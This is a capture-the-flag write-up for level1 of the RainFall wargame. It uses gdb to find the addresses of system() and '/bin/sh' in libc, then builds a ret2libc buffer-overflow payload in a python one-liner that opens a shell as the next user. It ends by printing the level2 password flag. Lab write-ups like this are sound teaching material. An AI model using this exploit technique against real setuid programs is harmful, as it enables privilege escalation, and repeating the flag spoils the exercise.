LEVEL_1:
# 📚 Exploiting `level1` – Exploit the overflow to get a shell.
    - get the system addr:
        level1@RainFall:~$ gdb ./level1
        (gdb) disas system
        Dump of assembler code for function system@plt:
        0x08048360 <+0>:     jmp    *0x80497a0
        0x08048366 <+6>:     push   $0x10
        0x0804836b <+11>:    jmp    0x8048330
        End of assembler dump.
        
    - get the /bin/sh addr : 
        level1@RainFall:~$ gdb ./level1
        (gdb) b main
        Breakpoint 1 at 0x8048483
        (gdb) run
        Starting program: /home/user/level1/level1

        Breakpoint 1, 0x08048483 in main ()
        (gdb) info proc map
        process 4123
        Mapped address spaces:

                Start Addr   End Addr       Size     Offset objfile
                0x8048000  0x8049000     0x1000        0x0 /home/user/level1/level1
                0x8049000  0x804a000     0x1000        0x0 /home/user/level1/level1
                0xb7e2b000 0xb7e2c000     0x1000        0x0
                0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
                0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
                0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
                0xb7fd2000 0xb7fd5000     0x3000        0x0
                0xb7fdb000 0xb7fdd000     0x2000        0x0
                0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
                0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
                0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
                0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
                0xbffdf000 0xc0000000    0x21000        0x0 [stack]
        (gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
        0xb7f8cc58
        1 pattern found.
        (gdb) x/s 0xb7f8cc58
        0xb7f8cc58:      "/bin/sh"
    

- system()	        ->    0x08048360	-> \x60\x83\x04\x08
- Fake Return Address	->    "AAAA"
- "/bin/sh" string    ->    0xb7f8cc58 ->	\x58\xcc\xf8\xb7

> (python -c 'print("A"*76 + "\x60\x83\x04\x08" + "AAAA" + "\x58\xcc\xf8\xb7")' ; cat ) | ./level1

whoami</br>
level2</br>
cd ..</br>
cd level2</br>
cat .pass</br>
```
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```